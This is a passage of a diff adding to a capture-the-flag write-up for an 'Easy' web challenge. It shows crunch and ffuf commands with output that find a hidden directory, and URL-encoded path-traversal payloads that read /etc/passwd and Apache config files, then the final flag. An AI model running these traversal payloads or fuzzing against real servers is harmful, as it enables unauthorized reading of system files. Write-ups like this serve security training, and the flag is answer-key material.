@@ -418,4 +418,121 @@ Welcome L33T Hacker, we need your help in fixing a missing directory D1r3C70XXX 
 The eaten part is XXX.
 we wish you the best of luck you l33t hacker.
 ```
-Naani!!! R4T eat what ??? 😂  nooo nau 
+Naani!!! R4T ate what ??? 😂  nooo nau don't tell me this we go fight. But no need for large vawulence for now, let's save it for later.
+let's create a wordlist with 3 characters for XXX so as to get the remaining 3 charaters that was eaten. remember what Muzec-san left for us in the page source earlier "easy like abcdef123456". so let's create a wordlist with that hint 
+
+```
+┌──(n16hth4wk㉿n16hthawk-sec)-[~/abcctf/Easy]
+└─$ crunch 3 3 abcdef123456  -o cruched.txt
+Crunch will now generate the following amount of data: 6912 bytes
+0 MB
+0 GB
+0 TB
+0 PB
+Crunch will now generate the following number of lines: 1728 
+
+crunch: 100% completed generating output
+
+```
+
+Now we've generated a wordlist, let's fuzz for the remaining part of the directory R4T sama ate.
+
+```
+┌──(n16hth4wk㉿n16hthawk-sec)-[~/abcctf/Easy]
+└─$ ffuf -u "http://185.203.119.220:8002/D1r3C70FUZZ" -w cruched.txt
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.5.0 Kali Exclusive <3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://185.203.119.220:8002/D1r3C70FUZZ
+ :: Wordlist         : FUZZ: cruched.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+________________________________________________
+
+64a                     [Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 160ms]
+:: Progress: [1728/1728] :: Job [1/1] :: 237 req/sec :: Duration: [0:00:11] :: Errors: 0 ::
+
+```
+Cool we got the remaining part of th Directory, let's check it out on our browser
+
+![image](https://user-images.githubusercontent.com/87468669/194636120-b3c25bfe-f5fe-4d90-a7fe-a5424ab78547.png)
+
+we got it nice let's play around 
+
+![image](https://user-images.githubusercontent.com/87468669/194636854-f28dae8c-c414-4e59-a400-7e8502fad925.png)
+
+clicked on the aboutus and got nothing... 🤔🤔🤔 but th path looks sus, so let's fuzz for lfi 
+
+![image](https://user-images.githubusercontent.com/87468669/194637325-9f5ea69a-5746-4eab-991f-9838db0c6d78.png)
+
+Hai hai wee got so many payload but we will only use th highlighted payload 
+```/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd```
+
+![image](https://user-images.githubusercontent.com/87468669/194637603-d9537bef-34a3-4119-99f9-17e2c9aa6e44.png)
+
+Sweeeeeeii... we got lfi, let's hunt for the flag
+
+![image](https://user-images.githubusercontent.com/87468669/194637800-901e0659-6e5c-4a40-a400-34e16b9a0db8.png)
+
+payload used: ```/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/flag.txt```
+checked /root directory for the flag but we got trolled by Muzec-san, but he directed us to the location where we can get the flag. ("Lost in one of the Apache config files sorry bro (:XD "). what next? let's create a wordlist containing apache config files
+
+![image](https://user-images.githubusercontent.com/87468669/194638867-3fca339f-4fbe-4cc8-9919-eadc598156d6.png)
+
+now we are done with the wordlist, let's fuzz
+
+```
+┌──(n16hth4wk㉿n16hthawk-sec)-[~/abcctf/Easy]
+└─$ ffuf -u "http://185.203.119.220:8002/D1r3C7064a/index.php?abcctf=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/FUZZ" -w apache.txt -fl 15
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.5.0 Kali Exclusive <3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://185.203.119.220:8002/D1r3C7064a/index.php?abcctf=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/FUZZ
+ :: Wordlist         : FUZZ: apache.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+ :: Filter           : Response lines: 15
+________________________________________________
+
+/etc/apache2/sites-enabled/000-default.conf [Status: 200, Size: 1865, Words: 275, Lines: 47, Duration: 394ms]
+/etc/apache2/sites-available/default-ssl.conf [Status: 200, Size: 6804, Words: 944, Lines: 149, Duration: 394ms]
+/etc/apache2/sites-available/000-default.conf [Status: 200, Size: 1865, Words: 275, Lines: 47, Duration: 402ms]
+:: Progress: [8/8] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
+
+```
+
+Let's try them out 
+
+![image](https://user-images.githubusercontent.com/87468669/194639722-0f93ac44-97bf-43bb-89b3-a9702d770043.png)
+
+payload used: ```/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/apache2/sites-enabled/000-default.conf```
+
+There we got the flag 
+
+Final Flag :- abcctf{0N3_11N3r_845H_70_63N3r473_D1r3C70rY_70_1F1}
+
+Nice challenge from Muzec-niisan 😉😉
